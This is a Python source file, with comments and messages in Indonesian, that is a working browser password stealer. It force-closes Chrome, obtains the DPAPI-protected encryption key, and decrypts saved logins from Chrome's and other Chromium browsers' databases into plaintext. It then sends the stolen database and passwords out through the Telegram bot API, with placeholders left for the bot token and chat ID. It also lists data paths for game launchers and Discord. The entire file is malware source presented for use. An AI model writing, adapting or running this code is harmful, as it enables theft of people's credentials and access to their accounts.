import os
import json
import base64
import sqlite3
import shutil
import time
import random
import platform
import requests
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Union
from dataclasses import dataclass
from Cryptodome.Cipher import AES
import win32crypt

@dataclass
class PasswordEntry:
    url: str
    username: str
    password: str

class BrowserPasswordDecryptor:
    def __init__(self):
        self.system = platform.system()
        
    def get_browser_path(self, browser: str, file: str) -> Optional[str]:
        paths = {
            # Browsers
            'chrome': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
                'Darwin': '~/Library/Application Support/Google/Chrome',
                'Linux': '~/.config/google-chrome'
            },
            'edge': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
                'Darwin': '~/Library/Application Support/Microsoft Edge',
                'Linux': '~/.config/microsoft-edge'
            },
            'brave': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'),
                'Darwin': '~/Library/Application Support/BraveSoftware/Brave-Browser',
                'Linux': '~/.config/BraveSoftware/Brave-Browser'
            },
            'opera': {
                'Windows': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'),
                'Darwin': '~/Library/Application Support/com.operasoftware.Opera',
                'Linux': '~/.config/opera'
            },
            'vivaldi': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Vivaldi', 'User Data'),
                'Darwin': '~/Library/Application Support/Vivaldi',
                'Linux': '~/.config/vivaldi'
            },
            'chromium': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Chromium', 'User Data'),
                'Darwin': '~/Library/Application Support/Chromium',
                'Linux': '~/.config/chromium'
            },
            'yandex': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Yandex', 'YandexBrowser', 'User Data'),
                'Darwin': '~/Library/Application Support/Yandex/YandexBrowser',
                'Linux': '~/.config/yandex-browser'
            },
            'slimjet': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Slimjet', 'User Data'),
                'Darwin': '~/Library/Application Support/Slimjet',
                'Linux': '~/.config/slimjet'
            },
            
            # Games
            'roblox': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Roblox'),
                'Darwin': '~/Library/Application Support/Roblox',
                'Linux': '~/.local/share/Roblox'
            },
            'minecraft': {
                'Windows': os.path.join(os.environ['APPDATA'], '.minecraft'),
                'Darwin': '~/Library/Application Support/minecraft',
                'Linux': '~/.minecraft'
            },
            'epicgames': {
                'Windows': os.path.join(os.environ['PROGRAMDATA'], 'Epic'),
                'Darwin': '~/Library/Application Support/Epic',
                'Linux': '~/.config/Epic'
            },
            'steam': {
                'Windows': os.path.join(os.environ['PROGRAMFILES(X86)'], 'Steam'),
                'Darwin': '~/Library/Application Support/Steam',
                'Linux': '~/.steam/steam'
            },
            'gog': {
                'Windows': os.path.join(os.environ['PROGRAMFILES(X86)'], 'GOG Galaxy'),
                'Darwin': '/Applications/GOG Galaxy.app',
                'Linux': '~/.local/share/Steam/steamapps/common'
            },
            'origin': {
                'Windows': os.path.join(os.environ['PROGRAMDATA'], 'Origin'),
                'Darwin': '~/Library/Application Support/Origin',
                'Linux': '~/.wine/drive_c/ProgramData/Origin'
            },
            'uplay': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Ubisoft Game Launcher'),
                'Darwin': '~/Library/Application Support/Ubisoft Game Launcher',
                'Linux': '~/.local/share/Steam/steamapps/compatdata/Ubisoft'
            },
            'battlenet': {
                'Windows': os.path.join(os.environ['PROGRAMDATA'], 'Battle.net'),
                'Darwin': '~/Library/Application Support/Battle.net',
                'Linux': '~/.wine/drive_c/ProgramData/Battle.net'
            },
            'discord': {
                'Windows': os.path.join(os.environ['APPDATA'], 'discord'),
                'Darwin': '~/Library/Application Support/discord',
                'Linux': '~/.config/discord'
            }
        }
        
        if browser not in paths or self.system not in paths[browser]:
            return None
            
        base_path = os.path.expanduser(paths[browser][self.system])
        if file == 'Local State':
            return os.path.join(base_path, file)
        return os.path.join(base_path, 'Default', file)

def try_decode_password(decrypted):
    if not decrypted:
        return "[KOSONG]"
    
    if isinstance(decrypted, str):
        return ''.join(c for c in decrypted if c.isprintable() or c.isspace())
    
    decodings = [
        ('utf-8', 'strict'),
        ('latin-1', 'strict'),
        ('utf-16', 'strict'),
        ('utf-16le', 'strict'),
        ('utf-16be', 'strict'),
        ('cp1252', 'strict'),
        ('cp850', 'strict'),
        ('cp437', 'strict'),
        ('ascii', 'ignore'),
        ('utf-8', 'replace'),
    ]
    
    for encoding, errors in decodings:
        try:
            result = decrypted.decode(encoding, errors=errors)
            result = ''.join(c for c in result if c.isprintable() or c.isspace())
            if result.strip():
                return result
        except (UnicodeDecodeError, AttributeError):
            continue
    
    try:
        cleaned = bytes(b for b in decrypted if b != 0)
        if cleaned != decrypted:
            result = try_decode_password(cleaned)
            if result != "[KOSONG]" and result != f"[BINER: {cleaned.hex()}]":
                return result
    except:
        pass
    
    for xor_key in [0x55, 0xAA, 0xFF, 0x00, 0x5A, 0xA5]:
        try:
            xored = bytes(b ^ xor_key for b in decrypted)
            result = try_decode_password(xored)
            if result != "[KOSONG]" and result != f"[BINER: {xored.hex()}]":
                return f"[XOR 0x{xor_key:02X}]: {result}"
        except:
            continue
    
    try:
        ascii_chars = [chr(b) for b in decrypted if 32 <= b <= 126]
        if ascii_chars:
            return ''.join(ascii_chars)
    except:
        pass
    
    try:
        cleaned = bytes(b if 32 <= b <= 126 else 32 for b in decrypted)
        result = cleaned.decode('ascii', errors='ignore')
        if result.strip():
            return f"[BERSIHKAN]: {result}"
    except:
        pass
    
    hex_repr = decrypted.hex()
    if len(hex_repr) > 50:
        hex_repr = hex_repr[:50] + "..."
    return f"[BINER: {hex_repr}]"

def get_encryption_key(browser='chrome'):
    decryptor = BrowserPasswordDecryptor()
    local_state_path = decryptor.get_browser_path(browser, 'Local State')
    
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        
        try:
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Peringatan: Gagal dekripsi DPAPI: {e}")
            if len(encrypted_key) in [16, 24, 32]:
                return encrypted_key
            raise ValueError("Tidak dapat mendekripsi kunci enkripsi")
            
    except Exception as e:
        print(f"ERROR - Gagal mendapatkan kunci enkripsi: {str(e)}")
        return None

def decrypt_password(password, key):
    if not password:
        return "[TIDAK ADA PASSWORD]"
    
    try:
        decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
        if decrypted:
            result = try_decode_password(decrypted)
            if result and result != "[KOSONG]":
                return result
    except:
        pass
    
    if isinstance(password, bytes) and len(password) > 15:
        for prefix in [b'v10', b'v11']:
            if password.startswith(prefix):
                try:
                    iv = password[3:15]
                    ciphertext = password[15:]
                    if len(ciphertext) > 16:
                        ciphertext = ciphertext[:-16]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(ciphertext)
                    result = try_decode_password(decrypted)
                    if result and result != "[KOSONG]":
                        return result
                except Exception:
                    continue
        
        try:
            iv = password[0:12]
            ciphertext = password[12:]
            if len(ciphertext) > 16:
                ciphertext = ciphertext[:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext)
            result = try_decode_password(decrypted)
            if result and result != "[KOSONG]":
                return result
        except Exception:
            pass
    
    if isinstance(password, bytes):
        return try_decode_password(password)
    
    return "[GAGAL DEKRIPSI]"

def safe_remove(filepath):
    if not filepath or not os.path.exists(filepath):
        return True
        
    max_retries = 5
    for _ in range(max_retries):
        try:
            os.remove(filepath)
            return True
        except (PermissionError, OSError):
            time.sleep(0.5)
    return False

class ChromePasswordExtractor:
    def __init__(self, silent: bool = True):
        self.silent = silent
        self.decryptor = BrowserPasswordDecryptor()
    
    def _log(self, message: str):
        if not self.silent:
            print(message)
    
    def extract_passwords(self) -> Tuple[bool, str, List[PasswordEntry]]:
        """
        Ekstrak password dari browser Chrome
        
        Returns:
            Tuple[bool, str, List[PasswordEntry]]: 
                - Status keberhasilan (bool)
                - Pesan status (str)
                - Daftar password yang berhasil diekstrak
        """
        try:
            self._log("Menutup Chrome...")
            os.system("taskkill /im chrome.exe /f >nul 2>&1")
            time.sleep(2)
            
            browsers = ['chrome', 'edge', 'brave', 'opera', 'vivaldi', 'chromium', 'yandex', 'slimjet']
            key = None
            
            for browser in browsers:
                self._log(f"Mencoba {browser}...")
                key = get_encryption_key(browser)
                if key:
                    self._log(f"Berhasil mendapatkan kunci dari {browser}")
                    break
            
            if not key:
                return False, "Tidak dapat mendapatkan kunci enkripsi dari browser manapun", []

            chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
            db_locations = [
                os.path.join(chrome_path, 'Default', 'Login Data'),
                os.path.join(chrome_path, 'Profile 1', 'Login Data'),
                os.path.join(chrome_path, 'Profile 2', 'Login Data')
            ]
            
            temp_db = None
            output_file = "password_terdekripsi.db"
            success = False
            passwords = []
            
            for db_path in db_locations:
                if not os.path.exists(db_path):
                    self._log(f"Database tidak ditemukan: {db_path}")
                    continue
                    
                temp_db = f"temp_login_{random.randint(1000, 9999)}.db"
                
                try:
                    for _ in range(3):
                        try:
                            shutil.copy2(db_path, temp_db)
                            break
                        except (PermissionError, OSError) as e:
                            self._log(f"Gagal menyalin database (percobaan {_ + 1}/3): {e}")
                            time.sleep(1)
                    else:
                        self._log(f"Gagal menyalin database setelah beberapa percobaan: {db_path}")
                        continue
                    
                    conn = None
                    try:
                        conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        conn_out = sqlite3.connect(output_file)
                        cursor_out = conn_out.cursor()
                        
                        cursor_out.execute('''
                            CREATE TABLE IF NOT EXISTS passwords (
                                id INTEGER PRIMARY KEY AUTOINCREMENT,
                                url TEXT,
                                username TEXT,
                                password TEXT,
                                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                            )
                        ''')
                        
                        count = 0
                        for row in cursor.fetchall():
                            try:
                                url, user, pwd = row
                                decrypted = decrypt_password(pwd, key)
                                
                                cursor_out.execute(
                                    'INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)',
                                    (url, user, decrypted)
                                )
                                
                                passwords.append(PasswordEntry(
                                    url=url,
                                    username=user,
                                    password=decrypted
                                ))
                                count += 1
                            except Exception as e:
                                self._log(f"Kesalahan memproses entri: {e}")
                                continue
                        
                        conn_out.commit()
                        conn_out.close()
                        
                        if count > 0:
                            success = True
                            return True, f"Berhasil mengekstrak {count} password ke {output_file}", passwords
                        
                    except sqlite3.Error as e:
                        self._log(f"Kesalahan database: {e}")
                        
                except Exception as e:
                    self._log(f"Kesalahan memproses {db_path}: {e}")
                    
                finally:
                    if conn:
                        conn.close()
                    
                    if temp_db and os.path.exists(temp_db):
                        safe_remove(temp_db)
            
            if not success:
                return False, "Gagal mengekstrak password. Pastikan Chrome ditutup dan coba lagi.", []
                
        except Exception as e:
            return False, f"Kesalahan tak terduga: {str(e)}", []
            
        finally:
            if temp_db and os.path.exists(temp_db):
                safe_remove(temp_db)
        
        return False, "Tidak ada password yang berhasil diekstrak.", []

class TelegramBot:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{self.token}"
    
    def send_message(self, text: str, parse_mode: str = "HTML") -> bool:
        """Mengirim pesan teks ke chat Telegram"""
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }
            response = requests.post(url, json=payload, timeout=30)
            return response.status_code == 200
        except Exception as e:
            print(f"Gagal mengirim pesan: {e}")
            return False
    
    def send_document(self, file_path: str, caption: str = "") -> bool:
        """Mengirim file ke chat Telegram"""
        try:
            url = f"{self.base_url}/sendDocument"
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id, 'caption': caption}
                response = requests.post(url, files=files, data=data, timeout=60)
                return response.status_code == 200
        except Exception as e:
            print(f"Gagal mengirim dokumen: {e}")
            return False

def format_passwords_for_telegram(passwords: List[PasswordEntry], max_length: int = 4000) -> List[str]:
    """Membagi daftar password menjadi beberapa pesan yang lebih kecil"""
    messages = []
    current_message = ""
    
    for entry in passwords:
        entry_text = f"<b>URL:</b> {entry.url}\n" \
                   f"<b>Username:</b> {entry.username}\n" \
                   f"<b>Password:</b> {entry.password}\n\n"
        
        if len(current_message) + len(entry_text) > max_length:
            messages.append(current_message)
            current_message = entry_text
        else:
            current_message += entry_text
    
    if current_message:
        messages.append(current_message)
    
    return messages

def main():
    # Konfigurasi Telegram Bot
    TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Ganti dengan token bot Anda
    TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"              # Ganti dengan chat ID Anda
    
    # Inisialisasi bot Telegram
    telegram_bot = None
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID and TELEGRAM_BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
        telegram_bot = TelegramBot(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
        print("Bot Telegram siap digunakan")
    else:
        print("Token atau Chat ID Telegram tidak valid, pengiriman ke Telegram dinonaktifkan")
    
    # Ekstrak password
    extractor = ChromePasswordExtractor(silent=False)
    success, message, passwords = extractor.extract_passwords()
    
    # Tampilkan hasil
    print(message)
    if success:
        print(f"Jumlah password yang berhasil diekstrak: {len(passwords)}")
        
        # Kirim ke Telegram jika bot aktif
        if telegram_bot and passwords:
            try:
                # Kirim file database
                db_file = "password_terdekripsi.db"
                if os.path.exists(db_file):
                    telegram_bot.send_document(
                        db_file,
                        caption=f"✅ Berhasil mengekstrak {len(passwords)} password"
                    )
                
                # Kirim ringkasan password
                summary = f"🔑 <b>Ringkasan Password ({len(passwords)})</b>\n"
                summary += "=" * 30 + "\n"
                
                # Hitung jumlah password per domain
                domain_count = {}
                for p in passwords:
                    domain = p.url.split('//')[-1].split('/')[0].replace('www.', '')
                    domain_count[domain] = domain_count.get(domain, 0) + 1
                
                # Tambahkan daftar domain ke ringkasan
                for domain, count in sorted(domain_count.items(), key=lambda x: x[1], reverse=True):
                    summary += f"• {domain}: {count} akun\n"
                
                # Kirim ringkasan
                telegram_bot.send_message(summary)
                
                # Kirim detail password (dalam beberapa pesan jika perlu)
                if len(passwords) <= 10:  # Hanya kirim detail jika jumlah password sedikit
                    messages = format_passwords_for_telegram(passwords)
                    for i, msg in enumerate(messages, 1):
                        telegram_bot.send_message(f"<b>Detail Password (Bagian {i}/{len(messages)})</b>\n\n{msg}")
                
                print("Hasil telah dikirim ke Telegram")
                
            except Exception as e:
                print(f"Gagal mengirim ke Telegram: {e}")

if __name__ == "__main__":
    main()